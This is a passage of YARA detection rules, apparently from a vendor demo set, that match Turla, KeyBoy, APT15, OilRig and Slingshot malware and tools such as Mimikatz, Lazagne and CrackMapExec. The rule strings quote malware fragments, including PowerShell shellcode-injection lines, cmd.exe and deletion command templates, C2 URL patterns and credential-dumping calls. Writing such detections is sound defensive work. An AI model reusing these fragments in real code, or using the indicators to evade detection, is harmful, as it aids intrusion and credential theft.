      $x1 = "1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s" fullword ascii
      $x3 = "mstotreg.dat" fullword ascii
      $x4 = "Bisuninst.bin" fullword ascii
      $x5 = "mfc42l00.pdb" fullword ascii
      $x6 = "ielocal~f.tmp" fullword ascii
      $s1 = "%s\\1.txt" fullword ascii
      $s2 = "%windows%" fullword ascii
      $s3 = "%s\\system32" fullword ascii
      $s4 = "\\Help\\SYSTEM32\\" fullword ascii
      $s5 = "%windows%\\mfc42l00.pdb" fullword ascii
      $s6 = "Size of log(%dB) is too big, stop write." fullword ascii
      $s7 = "Log: Size of log(%dB) is too big, stop write." fullword ascii
      $s8 = "%02d.%02d.%04d Log begin:" fullword ascii
      $s9 = "\\system32\\win.com" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 4 of them )
} 

rule Turla_KazuarRAT_RID2CCD : DEMO EXE FILE G0010 MAL RUSSIA T1136 {
   meta:
      description = "Detects Turla Kazuar RAT described by DrunkBinary"
      author = "Markus Neis"
      reference = "https://twitter.com/DrunkBinary/status/982969891975319553"
      date = "2018-04-08 10:04:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0010, MAL, RUSSIA, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "~1.EXE" wide
      $s2 = "dl32.dll" fullword ascii
      $s3 = "HookProc@" ascii
      $s4 = "0`.wtf" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and ( pe.imphash ( ) == "682156c4380c216ff8cb766a2f2e8817" or 2 of them )
} 

rule Crackmapexec_EXE_RID2D19 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects CrackMapExec hack tool"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-04-06 10:17:21"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "core.scripts.secretsdump(" fullword ascii
      $s2 = "core.scripts.samrdump(" fullword ascii
      $s3 = "core.uacdump(" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 2 of them
} 

rule SUSP_Imphash_PassRevealer_PY_EXE_RID32FA : DEMO EXE FILE HKTL SUSP T1003 T1136 {
   meta:
      description = "Detects an imphash used by password revealer and hack tools"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-04-06 14:28:11"
      score = 40
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, SUSP, T1003, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $fp1 = "Assmann Electronic GmbH" ascii wide
      $fp2 = "Oculus VR" ascii wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and pe.imphash ( ) == "ed61beebc8d019dd9bec823e2d694afd" and not 1 of ( $fp* )
} 

rule MAL_Unknown_PWDumper_Apr18_3_RID312A : DEMO EXE FILE HKTL T1003 T1136 {
   meta:
      description = "Detects sample from unknown sample set - IL origin"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-04-06 13:10:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "loaderx86.dll" fullword ascii
      $s2 = "tcpsvcs.exe" fullword wide
      $s3 = "%Program Files, Common FOLDER%" fullword wide
      $s4 = "%AllUsers, ApplicationData FOLDER%" fullword wide
      $s5 = "loaderx86" fullword ascii
      $s6 = "TNtDllHook$" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them
} 

rule CVE_2014_4076_Exploitcode_RID2F24 : DEMO EXE EXPLOIT FILE T1068 T1136 {
   meta:
      description = "Detects an exploit code for CVE-2014-4076"
      author = "Florian Roth"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2018-04-04 11:44:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, EXPLOIT, FILE, T1068, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] Created a new cmd.exe process" fullword ascii
      $x2 = "[+] Modified shellcode" fullword ascii
      $x3 = "[*] Spawning SYSTEM shell..." fullword ascii
      $x4 = "[*] MS14-070 (CVE-2014-4076) x86" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them
} 

rule PowerShell_JAB_B64_RID2D4D : DEMO SCRIPT SUSP T1086 T1132 T1136 {
   meta:
      description = "Detects base464 encoded $ sign at the beginning of a string"
      author = "Florian Roth"
      reference = "https://twitter.com/ItsReallyNick/status/980915287922040832"
      date = "2018-04-02 10:26:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, SUSP, T1086, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "('JAB" ascii wide
      $s2 = "powershell" nocase
   condition: 
      filesize < 30KB and all of them
} 

rule SUSP_PowerShell_String_K32_RemProcess_RID3507 : DEMO FILE SCRIPT SUSP T1064 T1086 T1136 {
   meta:
      description = "Detects suspicious PowerShell code that uses Kernel32, RemoteProccess handles or shellcode"
      author = "Florian Roth"
      reference = "https://github.com/nccgroup/redsnarf"
      date = "2018-03-31 15:55:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SCRIPT, SUSP, T1064, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Throw \"Unable to allocate memory in the remote process for shellcode\"" fullword ascii
      $x2 = "$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(\"kernel32.dll\")" fullword ascii
      $s3 = "$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants." ascii
      $s7 = "if ($RemoteProcHandle -eq [IntPtr]::Zero)" fullword ascii
      $s8 = "if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))" fullword ascii
      $s9 = "$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, " ascii
      $s15 = "$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x7566 and filesize < 6000KB and 1 of them
} 

rule KeyBoy_InstallClient_RID2EF9 : APT DEMO EXE FILE G0081 T1085 T1136 T1197 {
   meta:
      description = "Detects KeyBoy InstallClient"
      author = "Markus Neis, Florian Roth"
      reference = "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/"
      date = "2018-03-26 11:37:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0081, T1085, T1136, T1197"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "egsvr32.exe \"/u bitsadmin /canceft\\windows\\currebitsadmin" ascii
      $x2 = "/addfibitsadmin /Resumbitsadmin /SetNosoftware\\microsotifyCmdLine " ascii
      $x3 = "D:\\Work\\Project\\VS\\house\\Apple\\" ascii
      $x4 = "Bj+I11T6z9HFMG5Z5FMT/u62z9zw8FyWV0xrcK7HcYXkiqnAy5tc/iJuKtwM8CT3sFNuQu8xDZQGSR6D8/Bc/Dpuz8gMJFz+IrYqNAzwuPIitg==" fullword ascii
      $x5 = "szCmd1:%s" fullword ascii
      $s1 = "cmd.exe /c \"%s\"" fullword ascii
      $s4 = "rundll32.exe %s Main" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and ( 1 of ( $x* ) or 2 of them )
} 

rule KeyBoy_wab32res_RID2CAC : APT DEMO EXE FILE G0081 T1136 T1197 {
   meta:
      description = "Detects KeyBoy Loader wab32res.dll"
      author = "Markus Neis, Florian Roth"
      reference = "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/"
      date = "2018-03-26 09:59:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0081, T1136, T1197"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "B4490-2314-55C1- /Processid:{321bitsadmin /canceft\\windows\\curresoftware\\microso" fullword ascii
      $x2 = "D:\\Work\\VS\\House\\TSSL\\TSSL\\TClient" ascii
      $x3 = "\\Release\\FakeRun.pdb" ascii
      $x4 = "FakeRun.dll" fullword ascii
      $s1 = "cmd.exe /c \"%s\"" fullword ascii
      $s2 = "CreateProcess failed (%d)" fullword ascii
      $s3 = "CreateProcess %s " fullword ascii
      $s4 = "FindResource %s error " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 1 of ( $x* ) or 4 of them )
} 

rule KeyBoy_rasauto_RID2CC2 : APT DEMO EXE FILE G0081 T1035 T1085 T1136 {
   meta:
      description = "Detects KeyBoy ServiceClient"
      author = "Markus Neis, Florian Roth"
      reference = "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/"
      date = "2018-03-26 10:02:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0081, T1035, T1085, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $x1 = "rundll32.exe %s SSSS & exit" fullword ascii
      $x2 = "D:\\Work\\Project\\VS\\HSSL\\HSSL_Unicode _2\\Release\\ServiceClient.pdb" fullword ascii
      $s1 = "cmd.exe /c \"%s\"" fullword ascii
      $s2 = "CreateProcess failed (%d)" fullword ascii
      $s3 = "ServiceClient.dll" fullword ascii
      $s4 = "NtWow64QueryInformationProcess64 failed" fullword ascii
      $s5 = "pid:%d CmdLine:%S" fullword ascii
      $s6 = "rasauto32.ServiceMain" fullword ascii
      $s7 = "del /q/f %s\\%s*" fullword ascii
      $s8 = "szTmpDll:%s" fullword ascii
      $s9 = "lpCmdLine:%s" fullword ascii
      $s0 = "ReleaseFileFromRes:%s ok!" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.exports ( "SSSS" ) or 1 of ( $x* ) or 4 of them )
} 

rule KeyBoy_876_0x4e20000_RID2CFA : APT DEMO EXE FILE G0081 T1085 T1136 {
   meta:
      description = "Detects KeyBoy Backdoor"
      author = "Markus Neis, Florian Roth"
      reference = "https://blog.trendmicro.com/trendlabs-security-intelligence/tropic-trooper-new-strategy/"
      date = "2018-03-26 10:12:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0081, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "%s\\rundll32.exe %s ServiceTake %s %s" fullword ascii
      $x2 = "#%sCmd shell is not running,or your cmd is error!" fullword ascii
      $x3 = "Take Screen Error,May no user login!" fullword ascii
      $x4 = "Get logon user fail!" fullword ascii
      $x5 = "8. LoginPasswd:%s" fullword ascii
      $x6 = "Take Screen Error,service dll not exists" fullword ascii
      $s1 = "taskkill /f /pid %s" fullword ascii
      $s2 = "TClient.exe" fullword ascii
      $s3 = "%s\\wab32res.dll" fullword ascii
      $s4 = "%s\\rasauto.dll" fullword ascii
      $s5 = "Download file:%s index:%d" fullword ascii
      $s6 = "LogonUser: [%s]" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 3 of them )
} 

rule Lazagne_PW_Dumper_RID2DA5 : DEMO HKTL T1003 T1136 {
   meta:
      description = "Detects Lazagne PW Dumper"
      author = "Markus Neis, Florian Roth"
      reference = "https://github.com/AlessandroZ/LaZagne/releases/"
      date = "2018-03-22 10:40:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1003, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Crypto.Hash" fullword ascii
      $s2 = "laZagne" fullword ascii
      $s3 = "impacket.winregistry" fullword ascii
   condition: 
      3 of them
} 

rule Chafer_Mimikatz_Custom_RID2FD9 : APT DEMO EXE FILE G0087 MIDDLE_EAST S0002 T1003 T1075 T1097 T1136 T1178 {
   meta:
      description = "Detects Custom Mimikatz Version"
      author = "Florian Roth, Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22 12:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0087, MIDDLE_EAST, S0002, T1003, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\Users\\win7p\\Documents\\mi-back\\" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them
} 

rule Chafer_Exploit_Copyright_2017_RID31DF : APT DEMO EXE FILE G0087 MIDDLE_EAST T1136 {
   meta:
      description = "Detects Oilrig Internet Server Extension with Copyright (C) 2017 Exploit"
      author = "Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22 13:41:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0087, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "test3 Internet Server Extension" fullword wide
      $x2 = "Copyright (C) 2017 Exploit" fullword wide
      $a1 = "popen() failed!" fullword ascii
      $a2 = "cmd2cmd=" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( 1 of ( $x* ) or all of ( $a* ) )
} 

rule Oilrig_Myrtille_RID2D28 : APT DEMO EXE FILE G0049 T1076 T1136 {
   meta:
      description = "Detects Oilrig Myrtille RDP Browser"
      author = "Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22 10:19:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0049, T1076, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\obj\\Release\\Myrtille.Services.pdb" fullword ascii
      $x2 = "Failed to notify rdp client process exit (MyrtilleAppPool down?), remote session {0} ({1})" fullword wide
      $x3 = "Started rdp client process, remote session {0}" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them
} 

rule Chafer_Packed_Mimikatz_RID2FA6 : APT DEMO EXE FILE G0087 MIDDLE_EAST S0002 T1003 T1045 T1075 T1097 T1136 T1178 {
   meta:
      description = "Detects Oilrig Packed Mimikatz also detected as Chafer_WSC_x64 by FR"
      author = "Florian Roth, Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22 12:06:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0087, MIDDLE_EAST, S0002, T1003, T1045, T1075, T1097, T1136, T1178"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Windows Security Credentials" fullword wide
      $s2 = "Minisoft" fullword wide
      $x1 = "Copyright (c) 2014 - 2015 Minisoft" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( all of ( $s* ) or $x1 )
} 

rule Oilrig_PS_CnC_RID2BCC : APT DEMO G0049 T1086 T1136 {
   meta:
      description = "Powershell CnC using DNS queries"
      author = "Markus Neis"
      reference = "https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018b.pdf"
      date = "2018-03-22 09:21:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, G0049, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "(-join $base32filedata[$uploadedCompleteSize..$($uploadedCompleteSize" fullword ascii
      $s2 = "$hostname = \"D\" + $fileID + (-join ((65..90) + (48..57) + (97..122)|" ascii
   condition: 
      filesize < 40KB and 1 of them
} 

rule Impacket_Lateral_Movement_RID310D : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Detects Impacket Network Aktivity for Lateral Movement"
      author = "Markus Neis"
      reference = "https://github.com/CoreSecurity/impacket"
      date = "2018-03-22 13:06:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "impacket.dcerpc.v5.transport(" fullword ascii
      $s2 = "impacket.smbconnection(" fullword ascii
      $s3 = "impacket.dcerpc.v5.ndr(" fullword ascii
      $s4 = "impacket.spnego(" fullword ascii
      $s5 = "impacket.smb(" fullword ascii
      $s6 = "impacket.ntlm(" fullword ascii
      $s7 = "impacket.nmb(" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 14000KB and 2 of them
} 

rule TA18_074A_scripts_RID2CB1 : APT DEMO T1136 {
   meta:
      description = "Detects malware mentioned in TA18-074A"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA18-074A"
      date = "2018-03-16 10:00:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Running -s cmd /c query user on " ascii
   condition: 
      filesize < 600KB and 2 of them
} 

rule TA18_074A_screen_RID2C29 : APT DEMO EXE FILE T1113 T1136 {
   meta:
      description = "Detects malware mentioned in TA18-074A"
      author = "Florian Roth"
      reference = "https://www.us-cert.gov/ncas/alerts/TA18-074A"
      date = "2018-03-16 09:37:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1113, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "screen.exe" fullword wide
      $s2 = "PlatformInvokeUSER32" fullword ascii
      $s3 = "GetDesktopImageF" fullword ascii
      $s4 = "PlatformInvokeGDI32" fullword ascii
      $s5 = "Too many arguments, going to store in current dir" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 60KB and 3 of them
} 

rule APT15_Malware_Mar18_RoyalCli_RID30EA : APT DEMO EXE FILE G0004 MAL T1136 {
   meta:
      description = "Detects malware from APT 15 report by NCC Group"
      author = "Florian Roth"
      reference = "https://goo.gl/HZ5XMN"
      date = "2018-03-10 13:00:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0004, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Release\\RoyalCli.pdb" ascii
      $s2 = "%snewcmd.exe" fullword ascii
      $s3 = "Run cmd error %d" fullword ascii
      $s4 = "%s~clitemp%08x.ini" fullword ascii
      $s5 = "run file failed" fullword ascii
      $s6 = "Cmd timeout %d" fullword ascii
      $s7 = "2 %s  %d 0 %d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 2 of them
} 

rule APT15_Malware_Mar18_RoyalDNS_RID30B7 : APT DEMO EXE FILE G0004 MAL T1136 {
   meta:
      description = "Detects malware from APT 15 report by NCC Group"
      author = "Florian Roth"
      reference = "https://goo.gl/HZ5XMN"
      date = "2018-03-10 12:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0004, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $x1 = "del c:\\windows\\temp\\r.exe /f /q" fullword ascii
      $x2 = "%s\\r.exe" fullword ascii
      $s1 = "rights.dll" fullword ascii
      $s2 = "\"%s\">>\"%s\"\\s.txt" fullword ascii
      $s3 = "Nwsapagent" fullword ascii
      $s4 = "%s\\r.bat" fullword ascii
      $s5 = "%s\\s.txt" fullword ascii
      $s6 = "runexe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( ( pe.exports ( "RunInstallA" ) and pe.exports ( "RunUninstallA" ) ) or 1 of ( $x* ) or 2 of them )
} 

rule APT15_Malware_Mar18_BS2005_RID2F27 : APT DEMO EXE FILE G0004 MAL T1136 {
   meta:
      description = "Detects malware from APT 15 report by NCC Group"
      author = "Florian Roth"
      reference = "https://goo.gl/HZ5XMN"
      date = "2018-03-10 11:45:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0004, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "AAAAKQAASCMAABi+AABnhEBj8vep7VRoAEPRWLweGc0/eiDrXGajJXRxbXsTXAcZAABK4QAAPWwAACzWAAByrg==" fullword ascii
      $x2 = "AAAAKQAASCMAABi+AABnhKv3kXJJousn5YzkjGF46eE3G8ZGse4B9uoqJo8Q2oF0AABK4QAAPWwAACzWAAByrg==" fullword ascii
      $a1 = "http://%s/content.html?id=%s" fullword ascii
      $a2 = "http://%s/main.php?ssid=%s" fullword ascii
      $a3 = "http://%s/webmail.php?id=%s" fullword ascii
      $a9 = "http://%s/error.html?tab=%s" fullword ascii
      $s1 = "%s\\~tmp.txt" fullword ascii
      $s2 = "%s /C %s >>\"%s\" 2>&1" fullword ascii
      $s3 = "DisableFirstRunCustomize" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of them )
} 

rule APT15_Malware_Mar18_MSExchangeTool_RID332C : APT DEMO EXE FILE G0004 MAL T1136 {
   meta:
      description = "Detects malware from APT 15 report by NCC Group"
      author = "Florian Roth"
      reference = "https://goo.gl/HZ5XMN"
      date = "2018-03-10 14:36:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0004, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "\\Release\\EWSTEW.pdb" ascii
      $s2 = "EWSTEW.exe" fullword wide
      $s3 = "Microsoft.Exchange.WebServices.Data" fullword ascii
      $s4 = "tmp.dat" fullword wide
      $s6 = "/v or /t is null" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them
} 

rule Slingshot_APT_Minisling_RID3019 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:25:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "{6D29520B-F138-442e-B29F-A4E7140F33DE}" fullword ascii wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them
} 

rule Slingshot_APT_Spork_Downloader_RID32EC : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 14:25:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage: spork -c IP:PORT" fullword ascii wide
      $s2 = "connect-back IP address and port number" 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them
} 

rule Slingshot_APT_Ring0_Loader_RID30E5 : APT DEMO EXE FILE T1136 {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:59:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = " -> Missing element in DataDir -- cannot install" ascii
      $s2 = " -> Primary loader not present in the DataDir" ascii
      $s3 = "\\\\.\\amxpci" fullword ascii
      $s4 = " -> [Goad] ERROR in CreateFile:" fullword ascii
      $s5 = "\\\\.\\Sandra" fullword ascii
      $s6 = " -> [Sandra] RingZeroCode" fullword ascii
      $s7 = " -> [Sandra] Value from IOCTL_RDMSR:" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them
} 

rule Slingshot_APT_Malware_1_RID2FC8 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:11:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "SlingDll.dll" fullword ascii
      $s2 = "BogusDll." ascii
      $s3 = "smsvcrt -h 0x%p" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and ( pe.imphash ( ) == "7ead4bb0d752003ce7c062adb7ffc51a" or pe.exports ( "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW0000" ) or 1 of them )
} 

rule Slingshot_APT_Malware_2_RID2FC9 : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:12:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\\\?\\c:\\RECYCLER\\S-1-5-21-2225084468-623340172-1005306204-500\\INFO5" fullword wide
      $x_slingshot = {09 46 BE 57 42 DD 70 35 5E } 
      $s1 = "Opening service %s for stop access failed.#" fullword wide
      $s2 = "LanMan setting <%s> is ignored because system has a higher value already." fullword wide
      $s3 = "\\DosDevices\\amxpci" fullword wide
      $s4 = "lNTLMqSpPD" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 4 of them )
} 

rule Slingshot_APT_Malware_3_RID2FCA : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:12:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $a1 = "chmhlpr.dll" fullword ascii
      $s2 = "%hc%hc%hc%hc" fullword ascii
      $s3 = "%hc%hc%hc=" fullword ascii
      $s4 = "%hc%hc==" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( pe.imphash ( ) == "2f3b3df466e24e0792e0e90d668856bc" or pe.exports ( "dll_u" ) or ( $a1 and 2 of ( $s* ) ) )
} 

rule Slingshot_APT_Malware_4_RID2FCB : APT DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from Slingshot APT"
      author = "Florian Roth"
      reference = "https://securelist.com/apt-slingshot/84312/"
      date = "2018-03-09 12:12:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Ss -a 4104 -s 257092 -o 8 -l 406016 -r 4096 -z 315440" fullword wide
      $s1 = "Slingshot" fullword ascii
      $s2 = "\\\\?\\e:\\$Recycle.Bin\\" wide
      $s3 = "LineRecs.reloc" fullword ascii
